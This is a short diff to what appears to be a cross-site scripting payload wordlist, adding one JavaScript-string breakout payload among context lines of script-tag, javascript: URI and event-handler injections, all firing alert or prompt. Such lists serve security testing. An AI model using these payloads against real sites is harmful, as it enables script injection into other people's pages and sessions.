@@ -10,6 +10,7 @@
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 returnuri=%09Jav%09ascript:alert(document.domain)
 var onskeywords = 'hello';onload=prompt(0);
+'};alert('XSS');var x={y:'
 "hello" onmouseover=prompt(0) world=""
 test"t"\t/t%3Ct%3Et
 ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E]
